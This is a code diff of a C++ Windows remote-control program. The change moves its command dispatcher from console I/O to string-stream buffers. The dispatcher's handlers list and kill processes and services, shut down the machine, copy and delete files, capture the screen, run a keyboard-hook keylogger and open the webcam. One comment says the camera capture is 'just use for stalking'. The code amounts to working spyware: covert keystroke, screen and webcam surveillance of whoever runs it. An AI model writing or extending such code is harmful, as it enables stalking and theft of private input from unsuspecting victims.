@@ -4,106 +4,108 @@ VideoCapture* cap = nullptr;
 HHOOK hHook = NULL;
 atomic<bool> keepKeyloggerRunning;
 ofstream fo;
+wstringstream inp;
+wstringstream out;
 
-map<string, map<string, function<void()>>> setupHandlers() {
-    return map<string, map<string, function<void()>>>{
+map<wstring, map<wstring, function<void()>>> setupHandlers() {
+    return map<wstring, map<wstring, function<void()>>>{
         {
-            "list", 
-            map<string, function<void()>>{
-                { "app", listProcesses },
-                { "service", listServices }
+            L"list", 
+            map<wstring, function<void()>>{
+                { L"app", listProcesses },
+                { L"service", listServices }
             }
         },
         {
-            "start",
-            map<string, function<void()>>{
+            L"start",
+            map<wstring, function<void()>>{
                 {
-                    "app", 
+                    L"app", 
                     [] {
                         wstring appName;
-                        wcin >> appName;
+                        inp >> appName;
                         startApp((wchar_t*)appName.c_str());
                     }
                 },
                 {
-                    "service",
+                    L"service",
                     [] {
                         wstring serviceName;
-                        wcin >> serviceName;
+                        inp >> serviceName;
                         startServiceByName((wchar_t*)serviceName.c_str());
                     }
                 },
                 {
-                    "camera", startCamera
+                    L"camera", startCamera
                 },
                 {
-                    "keylogger", startKeylogger
+                    L"keylogger", startKeylogger
                 }
             }
         },
         {
-            "stop",
-            map<string, function<void()>>{
+            L"stop",
+            map<wstring, function<void()>>{
                 {
-                    "app", 
+                    L"app", 
                     [] {
                         unsigned long procID;
-                        cin >> procID;
+                        inp >> procID;
                         stopApp(procID);
                     }
                 },
                 {
-                    "service",
+                    L"service",
                     [] {
                         wstring serviceName;
-                        wcin >> serviceName;
+                        inp >> serviceName;
                         stopServiceByName((wchar_t*)serviceName.c_str());
                     }
                 },
                 {
-                    "camera", stopCamera
+                    L"camera", stopCamera
                 },
                 {
-                    "keylogger", stopKeylogger
+                    L"keylogger", stopKeylogger
                 }
             }
         },
         {
-            "power",
-            map<string, function<void()>>{
-                { "shutdown", shutdownMachine },
-                { "restart", restartMachine }
+            L"power",
+            map<wstring, function<void()>>{
+                { L"shutdown", shutdownMachine },
+                { L"restart", restartMachine }
             }
         },
         {
-            "file",
-            map<string, function<void()>>{
+            L"file",
+            map<wstring, function<void()>>{
                 {
-                    "copy",
+                    L"copy",
                     [] {
                         wstring srcPath, desPath;
-                        wcin >> srcPath >> desPath;
+                        inp >> srcPath >> desPath;
                         copyFile((wchar_t*)srcPath.c_str(), (wchar_t*)desPath.c_str());
                     }
                 },
                 {
-                    "delete",
+                    L"delete",
                     [] {
                         wstring filePath;
-                        wcin >> filePath;
+                        inp >> filePath;
                         deleteFile((wchar_t*)filePath.c_str());
                     }
                 }
             }
         },
         {
-            "capture",
-            map<string, function<void()>>{
+            L"capture",
+            map<wstring, function<void()>>{
                 { 
-                    "screen", 
+                    L"screen", 
                     [] {
-                        string outputPath;
-                        cin >> outputPath;
+                        wstring outputPath;
+                        inp >> outputPath;
                         captureScreen(outputPath);
                     }
                 }
@@ -117,15 +119,15 @@ void listProcesses() {
     entry.dwSize = sizeof(PROCESSENTRY32);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    cout << "\n Process ID | " << setw(26) << right << "Executable\n";
-    cout << string(12, '-') << "o" << string(40, '-') << endl;
+    out << "\n Process ID | " << setw(26) << right << "Executable\n";
+    out << wstring(12, '-') << "o" << wstring(40, '-') << endl;
     if (Process32First(snapshot, &entry)) {
         do {
-            wcout << setw(11) << right << entry.th32ProcessID << " | " << entry.szExeFile << endl;
+            out << setw(11) << right << entry.th32ProcessID << " | " << entry.szExeFile << endl;
         } while (Process32Next(snapshot, &entry));
     }
     else {
-        cerr << "\nFailed to list processes.\n";
+        out << "\nFailed to list processes.\n";
     }
     CloseHandle(snapshot);
 }
@@ -134,12 +136,12 @@ void startApp(wchar_t* appPath) {
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (CreateProcess(NULL, appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        cout << "\nProcess started successfully.\n";
+        out << "\nProcess started successfully.\n";
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
     else {
-        cerr << "\nFailed to start process.\n";
+        out << "\nFailed to start process.\n";
     }
 }
 
@@ -147,22 +149,22 @@ void stopApp(DWORD processID) {
     HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
     if (hProcess) {
         if (TerminateProcess(hProcess, 0)) {
-            cout << "\nProcess stopped successfully.\n";
+            out << "\nProcess stopped successfully.\n";
         }
         else {
-            cerr << "\nFailed to stop process.\n";
+            out << "\nFailed to stop process.\n";
         }
         CloseHandle(hProcess);
     }
     else {
-        cerr << "\nFailed to open process.\n";
+        out << "\nFailed to open process.\n";
     }
 }
 
 void listServices() {
     SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
     if (!scmHandle) {
-        cerr << "\nOpenSCManager failed with error: " << GetLastError() << endl;
+        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
         return;
     }
     
@@ -172,15 +174,15 @@ void listServices() {
     vector<BYTE> buffer(bytesNeeded);
     ENUM_SERVICE_STATUS* serviceStatus = reinterpret_cast<ENUM_SERVICE_STATUS*>(buffer.data());
     if (!EnumServicesStatus(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, serviceStatus, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
-        cerr << "\nEnumServicesStatus failed with error: " << GetLastError() << endl;
+        out << "\nEnumServicesStatus failed with error: " << GetLastError() << endl;
         CloseServiceHandle(scmHandle);
         return;
     }
 
-    cout << "\n" << setw(31) << right << "Service Name" << setw(22) << " | " << setw(57) << "Display Name" << setw(54) << " |  Status\n";
-    cout << string(51, '-') << "o" << string(102, '-') << "o" << string(10, '-') << endl;
+    out << "\n" << setw(31) << right << "Service Name" << setw(22) << " | " << setw(57) << "Display Name" << setw(54) << " |  Status\n";
+    out << wstring(51, '-') << "o" << wstring(102, '-') << "o" << wstring(10, '-') << endl;
     for (DWORD i = 0; i < servicesCount; ++i) {
-        wcout << setw(50) << left << serviceStatus[i].lpServiceName << " | " << setw(100) << serviceStatus[i].lpDisplayName << " | " << (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? L"Running" : L"Stopped") << endl;
+        out << setw(50) << left << wstring(serviceStatus[i].lpServiceName) << " | " << setw(100) << wstring(serviceStatus[i].lpDisplayName) << " | " << (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped") << endl;
     }
     
     CloseServiceHandle(scmHandle);
@@ -189,22 +191,22 @@ void listServices() {
 void startServiceByName(LPCWSTR serviceName) {
     SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
     if (!scmHandle) {
-        cerr << "\nOpenSCManager failed with error: " << GetLastError() << endl;
+        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
         return;
     }
 
     SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_START);
     if (!serviceHandle) {
-        cerr << "\nOpenService failed with error: " << GetLastError() << endl;
+        out << "\nOpenService failed with error: " << GetLastError() << endl;
         CloseServiceHandle(scmHandle);
         return;
     }
 
     if (!StartService(serviceHandle, 0, nullptr)) {
-        cerr << "\nStartService failed with error: " << GetLastError() << endl;
+        out << "\nStartService failed with error: " << GetLastError() << endl;
     }
     else {
-        cout << "\nService started successfully." << endl;
+        out << "\nService started successfully." << endl;
     }
     
     CloseServiceHandle(serviceHandle);
@@ -214,23 +216,23 @@ void startServiceByName(LPCWSTR serviceName) {
 void stopServiceByName(LPCWSTR serviceName) {
     SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
     if (!scmHandle) {
-        cerr << "\nOpenSCManager failed with error: " << GetLastError() << endl;
+        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
         return;
     }
 
     SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_STOP);
     if (!serviceHandle) {
-        cerr << "\nOpenService failed with error: " << GetLastError() << endl;
+        out << "\nOpenService failed with error: " << GetLastError() << endl;
         CloseServiceHandle(scmHandle);
         return;
     }
 
     SERVICE_STATUS status;
     if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
-        cerr << "\nControlService failed with error: " << GetLastError() << endl;
+        out << "\nControlService failed with error: " << GetLastError() << endl;
     }
     else {
-        cout << "\nService stopped successfully." << endl;
+        out << "\nService stopped successfully." << endl;
     }
 
     CloseServiceHandle(serviceHandle);
@@ -242,10 +244,10 @@ void shutdownMachine() {
         return;
     }
     if (InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, FALSE, REASON_OTHER)) {
-        cout << "\nShutdown initiated successfully.\n";
+        out << "\nShutdown initiated successfully.\n";
     }
     else {
-        cerr << "\nFailed to initiate shutdown.\n";
+        out << "\nFailed to initiate shutdown.\n";
     }
 }
 
@@ -254,32 +256,32 @@ void restartMachine() {
         return;
     }
     if (InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, TRUE, REASON_OTHER)) {
-        cout << "\nRestart initiated successfully.\n";
+        out << "\nRestart initiated successfully.\n";
     }
     else {
-        cerr << "\nFailed to initiate restart.\n";
+        out << "\nFailed to initiate restart.\n";
     }
 }
 
 void copyFile(LPCWSTR src, LPCWSTR dest) {
     if (CopyFile(src, dest, FALSE)) {
-        cout << "\nFile copied successfully.\n";
+        out << "\nFile copied successfully.\n";
     }
     else {
-        cerr << "\nFailed to copy file.\n";
+        out << "\nFailed to copy file.\n";
     }
 }
 
 void deleteFile(LPCWSTR filePath) {
     if (DeleteFile(filePath)) {
-        cout << "\nFile deleted successfully.\n";
+        out << "\nFile deleted successfully.\n";
     }
     else {
-        cerr << "\nFailed to delete file.\n";
+        out << "\nFailed to delete file.\n";
     }
 }
 
-void captureScreen(string outputPath) {
+void captureScreen(wstring outputPath) {
     // Get the desktop device context (DC)
     HDC hScreenDC = GetDC(NULL);
     HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
@@ -319,15 +321,15 @@ void captureScreen(string outputPath) {
     // Check if the capture was successful
     if (!bgrMat.empty()) {
         // Save the captured screen to a file
-        if (imwrite(outputPath, bgrMat)) {
-            cout << "\nScreenshot saved as " << outputPath << endl;
+        if (imwrite(string(outputPath.begin(), outputPath.end()), bgrMat)) {
+            out << "\nScreenshot saved as " << outputPath << endl;
         }
         else {
-            cerr << "\nFailed to save the screenshot.\n";
+            out << "\nFailed to save the screenshot.\n";
         }
     }
     else {
-        cerr << "\nFailed to capture screen.\n";
+        out << "\nFailed to capture screen.\n";
     }
 }
 
@@ -386,14 +388,14 @@ void startKeylogger() {
     keepKeyloggerRunning = true;
     thread keyloggerThread(KeyloggerThread);
     keyloggerThread.detach(); // Detach the thread to run independently
-    cout << "\nKeylogger started successfully.\n";
+    out << "\nKeylogger started successfully.\n";
 }
 
 void stopKeylogger() {
     keepKeyloggerRunning = false;
     // Post a message to wake up the message loop
     PostThreadMessage(GetCurrentThreadId(), WM_QUIT, 0, 0);
-    cout << "\nKeylogger stopped successfully.\n";
+    out << "\nKeylogger stopped successfully.\n";
     fo.close();
 }
 
@@ -407,10 +409,10 @@ void startCamera() {
     imwrite(path, frame); // Just use for stalking =))
 
     if (cap->isOpened()) {
-        cout << "\nWebcam opened successfully.\n";
+        out << "\nWebcam opened successfully.\n";
     }
     else {
-        cerr << "\nFailed to open webcam.\n";
+        out << "\nFailed to open webcam.\n";
     }
 }
 
@@ -418,10 +420,10 @@ void stopCamera() {
     if (cap && cap->isOpened()) {
         cap->release();
         destroyAllWindows();
-        cout << "\nWebcam closed successfully.\n";
+        out << "\nWebcam closed successfully.\n";
     }
     else {
-        cerr << "\nError: Webcam is not open.\n";
+        out << "\nError: Webcam is not open.\n";
     }
 }
 
@@ -431,13 +433,13 @@ bool enableShutdownPrivilege() {
 
     // Open a handle to the process's access token
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
-        cerr << "\nFailed to open process token. Error: " << GetLastError() << endl;
+        out << "\nFailed to open process token. Error: " << GetLastError() << endl;
         return false;
     }
 
     // Look up the LUID for the shutdown privilege
     if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
-        cerr << "\nFailed to lookup privilege value. Error: " << GetLastError() << endl;
+        out << "\nFailed to lookup privilege value. Error: " << GetLastError() << endl;
         CloseHandle(token);
         return false;
     }
@@ -447,7 +449,7 @@ bool enableShutdownPrivilege() {
 
     // Adjust the token's privileges to enable shutdown privilege
     if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
-        cerr << "\nFailed to adjust token privileges. Error: " << GetLastError() << endl;
+        out << "\nFailed to adjust token privileges. Error: " << GetLastError() << endl;
         CloseHandle(token);
         return false;
     }
